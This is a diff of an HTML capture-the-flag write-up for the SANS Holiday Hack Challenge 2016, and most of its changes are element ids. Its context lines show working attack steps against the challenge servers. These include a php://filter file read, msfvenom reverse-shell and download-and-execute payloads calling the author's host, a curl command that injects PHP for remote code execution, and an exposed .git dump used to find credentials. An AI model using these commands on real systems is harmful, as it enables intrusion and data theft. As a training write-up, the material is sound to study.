+<pre class="src src-sh" id="org5a1587d">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
 -d <span style="color: #b5bd68;">'{"date": "20170101010101-0800", "udid": "11111111", "debug": "com.northpolewonderland.santagram.EditProfile, EditProfile", "freemem": "10200"}'</span> <span style="color: #b5bd68;">\</span>
 http://dev.northpolewonderland.com/index.php | python -mjson.tool
 </pre>
@@ -1943,7 +1943,7 @@ Luckily, the response includes the request, and we see that an additional field 
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org58d00d7">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
+<pre class="src src-sh" id="org86d18f8">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
 -d <span style="color: #b5bd68;">'{"date": "20170101010101-0800", "udid": "11111111", "debug": "com.northpolewonderland.santagram.EditProfile, \</span>
 <span style="color: #b5bd68;">     EditProfile", "freemem": "10200", "verbose": true}'</span> <span style="color: #b5bd68;">\</span>
 http://dev.northpolewonderland.com/index.php | python -mjson.tool
@@ -2018,9 +2018,9 @@ Looks like we got discombobulatedaudio4.mp3.
 </p>
 </div>
 </div>
-<div id="outline-container-org4028466" class="outline-3">
-<h3 id="org4028466">The Banner Ad Server</h3>
-<div class="outline-text-3" id="text-org4028466">
+<div id="outline-container-org6a9d097" class="outline-3">
+<h3 id="org6a9d097">The Banner Ad Server</h3>
+<div class="outline-text-3" id="text-org6a9d097">
 <p>
 Visiting <a href="http://ads.northpolewonderland.com/">http://ads.northpolewonderland.com/</a>, we see a very smiley web app, which seems to rely heavily on Javascript. Taking a look at the source code has many references to Meteor, a Javascript framework.
 Pepper Minstix has some advice for us:
@@ -2053,14 +2053,14 @@ Downloading the file in the last entry gives us discombobulatedaudio5.mp3.
 </p>
 </div>
 </div>
-<div id="outline-container-org07e7676" class="outline-3">
-<h3 id="org07e7676">The Uncaught Exception Handler Server</h3>
-<div class="outline-text-3" id="text-org07e7676">
+<div id="outline-container-orgc0e0ec7" class="outline-3">
+<h3 id="orgc0e0ec7">The Uncaught Exception Handler Server</h3>
+<div class="outline-text-3" id="text-orgc0e0ec7">
 <p>
 Once more, we have a URL, and can search through the decompiled app to see how it's intended to be used. We have two hits, which send a POST request with JSON content. Let's start poking at it and see what we need to send:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org39c5441">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{}'</span> http://ex.northpolewonderland.com/exception.php
+<pre class="src src-sh" id="org86fc7ea">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{}'</span> http://ex.northpolewonderland.com/exception.php
 </pre>
 </div>
 
@@ -2069,7 +2069,7 @@ Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org7bebe1c">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump"}'</span> http://ex.northpolewonderland.com/exception.php
+<pre class="src src-sh" id="org818d973">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump"}'</span> http://ex.northpolewonderland.com/exception.php
 </pre>
 </div>
 
@@ -2078,7 +2078,7 @@ Fatal error! JSON key 'data' must be set.
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgd66b0bb">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": "Yes, please!"}'</span> http://ex.northpolewonderland.com/exception.php
+<pre class="src src-sh" id="orgab067bc">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": "Yes, please!"}'</span> http://ex.northpolewonderland.com/exception.php
 </pre>
 </div>
 
@@ -2087,7 +2087,7 @@ Fatal error! JSON key 'crashdump' must be set.
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org2301c78">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": "Yes, please!", "crashdump": "dump"}'</span> http://ex.northpolewonderland.com/exception.php
+<pre class="src src-sh" id="org247d6a0">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": "Yes, please!", "crashdump": "dump"}'</span> http://ex.northpolewonderland.com/exception.php
 </pre>
 </div>
 
@@ -2099,7 +2099,7 @@ Fatal error! JSON key 'crashdump' must be set.
 Interesting. Let's see if data is a nested object, and crashdump is a key in there:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org80ec943">curl -sv -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": {"crashdump": "dump"}}'</span> http://ex.northpolewonderland.com/exception.php
+<pre class="src src-sh" id="org499ec66">curl -sv -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d <span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": {"crashdump": "dump"}}'</span> http://ex.northpolewonderland.com/exception.php
 </pre>
 </div>
 
@@ -2116,7 +2116,7 @@ Interesting. Let's see if data is a nested object, and crashdump is a key in the
 Progress. We need to figure out a valid resource for it to read, though:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org1214e8e">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d $<span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": {"crashdump": "php://filter/convert.base64-encode/resource=exception"}}'</span> http://ex.northpolewonderland.com/exception.php | base64 -D &gt; exception.php
+<pre class="src src-sh" id="org910fd20">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> -d $<span style="color: #b5bd68;">'{"operation":"ReadCrashDump", "data": {"crashdump": "php://filter/convert.base64-encode/resource=exception"}}'</span> http://ex.northpolewonderland.com/exception.php | base64 -D &gt; exception.php
 </pre>
 </div>
 
@@ -2284,9 +2284,9 @@ Bingo. We note a comment towards the top of the file:
 and just like that, we have our penultimate audio file, from <a href="http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3">http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3</a>
 </p>
 </div>
-<div id="outline-container-org1fd06dc" class="outline-4">
-<h4 id="org1fd06dc">Digging Deeper: Command Execution</h4>
-<div class="outline-text-4" id="text-org1fd06dc">
+<div id="outline-container-org5543779" class="outline-4">
+<h4 id="org5543779">Digging Deeper: Command Execution</h4>
+<div class="outline-text-4" id="text-org5543779">
 <p>
 There's a more serious vulnerability in exception.php, and it allows for remote command execution.
 </p>
@@ -2366,7 +2366,7 @@ Let's try to get a meterpreter shell.
 First, let's create a reverse TCP meterpreter payload. We'll create a binary, since execution is a bit more reliable than by using PHP directly. We'll name it something nice and innocuous:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgfe26810">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp <span style="color: #8abeb7;">LHOST</span>=<span style="color: #de935f;">98.222.48.12</span> -f elf -o /srv/www/favicon.ico
+<pre class="src src-sh" id="orgc26ce04">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp <span style="color: #8abeb7;">LHOST</span>=<span style="color: #de935f;">98.222.48.12</span> -f elf -o /srv/www/favicon.ico
 </pre>
 </div>
 
@@ -2381,7 +2381,7 @@ Now, we'll create the PHP payload which will download and run our binary. We'll 
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org8f3db41">msfvenom -a php --platform php -p php/download_exec <span style="color: #8abeb7;">URL</span>=http://home.grigorescu.org/favicon.ico -e php/base64 -o payload.php
+<pre class="src src-sh" id="org6116a1d">msfvenom -a php --platform php -p php/download_exec <span style="color: #8abeb7;">URL</span>=http://home.grigorescu.org/favicon.ico -e php/base64 -o payload.php
 </pre>
 </div>
 
@@ -2399,7 +2399,7 @@ Because ex.northpolewonderland.com is behind some kind of NAT, we can't access i
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org30b07e9">msfconsole
+<pre class="src src-sh" id="org1e9d994">msfconsole
 </pre>
 </div>
 
@@ -2422,7 +2422,7 @@ msf exploit(handler) &gt; run
 Now we can send our payload, which will create the PHP file:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orge65fabc">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
+<pre class="src src-sh" id="orgc711ea9">curl -s -H <span style="color: #b5bd68;">"Content-Type: application/json"</span> <span style="color: #b5bd68;">\</span>
 -d $<span style="color: #b5bd68;">'{"operation":"WriteCrashDump", "data": {"crashdump": "a\'</span><span style="color: #88090B;">)</span>; <span style="color: #b5bd68;">'$(</span><span style="color: #81a2be;">cat</span><span style="color: #b5bd68;"> payload.php)$'</span> print <span style="color: #88090B;">(</span><span style="color: #b5bd68;">\'"}}' \</span>
 <span style="color: #b5bd68;">http://ex.northpolewonderland.com/exception.php</span>
 </pre>
@@ -2440,7 +2440,7 @@ Now we can send our payload, which will create the PHP file:
 Now we request our malicious PHP file and it will connect back to our Metasploit session!
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="org76860b9">curl -s http://ex.northpolewonderland.com/docs/crashdump-0G1ECh.php
+<pre class="src src-sh" id="org6784a7c">curl -s http://ex.northpolewonderland.com/docs/crashdump-0G1ECh.php
 </pre>
 </div>
 
@@ -2493,9 +2493,9 @@ At this point, we could use this system to pivot from by scanning internal netwo
 </p>
 </div>
 </div>
-<div id="outline-container-org2a91b5e" class="outline-4">
-<h4 id="org2a91b5e">Command Execution (Again&#x2026;)</h4>
-<div class="outline-text-4" id="text-org2a91b5e">
+<div id="outline-container-org5aada36" class="outline-4">
+<h4 id="org5aada36">Command Execution (Again&#x2026;)</h4>
+<div class="outline-text-4" id="text-org5aada36">
 <p>
 On January 4th, around 21:12 ETC, Jeff fixed the vulnerability!
 </p>
@@ -2505,22 +2505,22 @@ On January 4th, around 21:12 ETC, Jeff fixed the vulnerability!
 </pre>
 </div>
 
-<div class="highlight"><pre><span></span><span class="gh">diff --git 1/exception_20170103.php 2/exception_20170104.php</span>
+<div class="highlight"><pre><span></span><span class="gh">diff --git 1/exception.php 2/exception_fixed.php</span>
 <span class="gh">index cf94723..0abca9b 100644</span>
-<span class="gd">--- 1/exception_20170103.php</span>
-<span class="gi">+++ 2/exception_20170104.php</span>
-<span class="gu">@@ -15,7 +15,11 @@ if(strcasecmp(, &#39;application/json&#39;) != 0){</span>
+<span class="gd">--- 1/exception.php</span>
+<span class="gi">+++ 2/exception_fixed.php</span>
+<span class="gu">@@ -15,7 +15,11 @@ if(strcasecmp($contentType, &#39;application/json&#39;) != 0){</span>
  }
 
  # Grab the raw POST. Necessary for JSON in particular.
-<span class="gi">+ = &quot;&#39;&quot;;</span>
-<span class="gi">+ = &quot;&quot;;</span>
+<span class="gi">+$quote = &quot;&#39;&quot;;</span>
+<span class="gi">+$blank = &quot;&quot;;</span>
 <span class="gi">+</span>
-  = file_get_contents(&quot;php://input&quot;);
-<span class="gi">+ = str_replace(, , );</span>
-  = json_decode(, true);
+ $content = file_get_contents(&quot;php://input&quot;);
+<span class="gi">+$content = str_replace($quote, $blank, $content);</span>
+ $obj = json_decode($content, true);
  	# If json_decode failed, the JSON is invalid.
- if(!is_array()){
+ if(!is_array($obj)){
 </pre></div>
 
 <p>
@@ -2565,9 +2565,9 @@ http://ex.northpolewonderland.com/exception.php | grep crashdump
 </div>
 </div>
 </div>
-<div id="outline-container-org4c9c295" class="outline-3">
-<h3 id="org4c9c295">The Mobile Analytics Server (post authentication)</h3>
-<div class="outline-text-3" id="text-org4c9c295">
+<div id="outline-container-orgb20f081" class="outline-3">
+<h3 id="orgb20f081">The Mobile Analytics Server (post authentication)</h3>
+<div class="outline-text-3" id="text-orgb20f081">
 <p>
 Last one. Let's quickly review the hints from the Holiday Hack Quest:
 </p>
@@ -2632,7 +2632,7 @@ The only hint that we haven't used yet is using to scan for extra files on a web
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="org56eba60">nmap -sC -p <span style="color: #de935f;">443</span> <span style="color: #de935f;">104.198.252.157</span>
+<pre class="src src-sh" id="orgffee77b">nmap -sC -p <span style="color: #de935f;">443</span> <span style="color: #de935f;">104.198.252.157</span>
 </pre>
 </div>
 
@@ -2664,7 +2664,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds
 Git repository found! Let's recursively download it, then restore everything to the latest master:
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orga5abb6a">wget -np -qr https://analytics.northpolewonderland.com/.git/
+<pre class="src src-sh" id="org718cbe4">wget -np -qr https://analytics.northpolewonderland.com/.git/
 git reset --hard master
 </pre>
 </div>
@@ -2674,7 +2674,7 @@ HEAD is now at 16ae0cb Finishing touches (style, css, etc)
 </pre>
 
 <div class="org-src-container">
-<pre class="src src-sh" id="orgb0eb013">ls
+<pre class="src src-sh" id="orgd1f2d48">ls
 </pre>
 </div>
 
@@ -2688,7 +2688,7 @@ css              fonts            header.php       login.php        query.php   
 Can we find some non-guest credentials?
 </p>
 <div class="org-src-container">
-<pre class="src src-sh" id="orgac424a4">git log -p | grep guest
+<pre class="src src-sh" id="orgb8683d9">git log -p | grep guest
 </pre>
 </div>
 
@@ -2917,9 +2917,9 @@ There it is! We just need to tweak our query a bit so that we can get it. <code>
 </tbody>
 </table>
 </div>
-<div id="outline-container-org912ce72" class="outline-4">
-<h4 id="org912ce72">Automating the Attack</h4>
-<div class="outline-text-4" id="text-org912ce72">
+<div id="outline-container-org176b26c" class="outline-4">
+<h4 id="org176b26c">Automating the Attack</h4>
+<div class="outline-text-4" id="text-org176b26c">
 <p>
 This last vulnerability had a lot of moving parts, so we tried to automate it:
 </p>
@@ -3053,9 +3053,9 @@ Executing query..
 </div>
 </div>
 </div>
-<div id="outline-container-orgda1894e" class="outline-3">
-<h3 id="orgda1894e">Putting it All Together</h3>
-<div class="outline-text-3" id="text-orgda1894e">
+<div id="outline-container-org52dedee" class="outline-3">
+<h3 id="org52dedee">Putting it All Together</h3>
+<div class="outline-text-3" id="text-org52dedee">
 <p>
 We'll join our MP3's together, speed them up a bit, and see what we hear:
 </p>
@@ -3076,12 +3076,12 @@ This is the password to the last door.
 </div>
 </div>
 </div>
-<div id="outline-container-orga60ca86" class="outline-2">
-<h2 id="orga60ca86">Bonus: Holiday Hack Quest</h2>
-<div class="outline-text-2" id="text-orga60ca86">
-</div><div id="outline-container-org282def6" class="outline-3">
-<h3 id="org282def6">Coins</h3>
-<div class="outline-text-3" id="text-org282def6">
+<div id="outline-container-org4959788" class="outline-2">
+<h2 id="org4959788">Bonus: Holiday Hack Quest</h2>
+<div class="outline-text-2" id="text-org4959788">
+</div><div id="outline-container-org881c2ef" class="outline-3">
+<h3 id="org881c2ef">Coins</h3>
+<div class="outline-text-3" id="text-org881c2ef">
 <p>
 Finding the coins is tricky! Nothing to stop us from cheating one more time, though&#x2026;
 </p>
@@ -3383,9 +3383,9 @@ For the other 7 coins, we need to go back in time:
 </div>
 </div>
 </div>
-<div id="outline-container-org3f3eeb7" class="outline-3">
-<h3 id="org3f3eeb7">Easter Eggs</h3>
-<div class="outline-text-3" id="text-org3f3eeb7">
+<div id="outline-container-org6347e31" class="outline-3">
+<h3 id="org6347e31">Easter Eggs</h3>
+<div class="outline-text-3" id="text-org6347e31">
 <p>
 There are a few dates scattered around in the game. The Grinch sign counts from the most recent Christmas (since a Grinch-level event happened on 12/25/2016 as well). The Grinch sign in 1978 counts from the release of The Grinch who Stole Christmas on TV. When we time travel, we go to the day before the Star Wars Christmas Special airs.
 </p>
@@ -3426,9 +3426,9 @@ Finally, we ran into a couple of extra characters:
 </div>
 </div>
 </div>
-<div id="outline-container-org4b5b2a2" class="outline-2">
-<h2 id="org4b5b2a2">Final Thoughts</h2>
-<div class="outline-text-2" id="text-org4b5b2a2">
+<div id="outline-container-orge962750" class="outline-2">
+<h2 id="orge962750">Final Thoughts</h2>
+<div class="outline-text-2" id="text-orge962750">
 <p>
 If it wasn't obvious by now, we had a blast. Much of what we learned is directly applicable to our day jobs, and this is just another reason that SANS is so great for learning and developing your skills. Big thanks to the CounterHack team and everyone else who helped with this. Hope to see you next year!
 </p>
